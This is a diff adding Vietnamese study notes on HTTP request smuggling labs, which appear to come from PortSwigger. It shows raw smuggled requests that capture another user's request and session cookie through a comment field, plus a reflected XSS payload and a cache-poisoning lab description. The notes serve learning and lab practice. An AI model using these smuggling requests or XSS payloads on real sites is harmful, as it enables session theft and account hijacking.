@@ -585,5 +585,110 @@ To solve the lab, smuggle a request to the back-end server that causes the next 
 
 ```
 
+Bài lab mô tả rằng trong lần này chúng ta phải khai thác được cookie của người dùng tiếp theo bằng lỗ hổng trên. Để làm được điều đó chúng ta cần tìm hiểu 1 kỹ thuật khai thác của HTTP requset smuggling là Capturing other users' requests.
+#### Capturing other users' requests
+
+Các ứng dụng web nếu tồn tại chức năng lưu trữ và truy xuất thì sẽ tạo điều kiện cho việc HRS khai thác và truy xuất dữ liệu của người dùng tiếp theo. Có thể truy xuất session tokens, chiếm quyền hoặc leak những thông tin nhạy cảm của người dùng. Các chức năng tiềm năng để khai thác là comment, email, profile descriptions, screen names,...
+
+Để thực hiện cuộc tấn công, bạn cần thực hiện HRS gửi dữ liệu đến hàm lưu trữ, với tham số chứa dữ liệu được đặt ở vị trí cuối cùng trong request. Request tiếp theo được xử lý bởi máy chủ back-end sẽ được thêm vào smuggled request, với kết quả trả về là 1 bản raw request của người dùng khác.
+
+Giả sử rằng request của 1 ứng dụng như sau : 
+```
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 154
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
+```
+Đây là 1 chức năng cmt có sesion tokens và csrf tokens. Ta có thể khai thác như sau : 
+```
+GET / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 324
+
+0
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
+```
+
+Sử dụng 1 request phân đoạn như sau: 
+```
+GET / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 324
+
+0
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
+```
+Thì kết quả trả về chúng ta nhận được là : 
+```
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
+...
+
+```
+
+
+Tương tự với lý thuyết như thế chúng ta truy cập bài lab. Và thấy được 1 blog như sau.
+
+
+
+
+
+
+### Lab: Exploiting HTTP request smuggling to deliver reflected XSS
+```
+This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
+
+The application is also vulnerable to reflected XSS via the User-Agent header.
+
+To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).
+```
+
+
+
+
+
+
+```
+
+<img src=1 onerror=alert(1)>
+```
+
+
+
+
+### Lab: Exploiting HTTP request smuggling to perform web cache poisoning
+```
+This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.
+
+To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert document.cookie.
+```
+
+
 
 
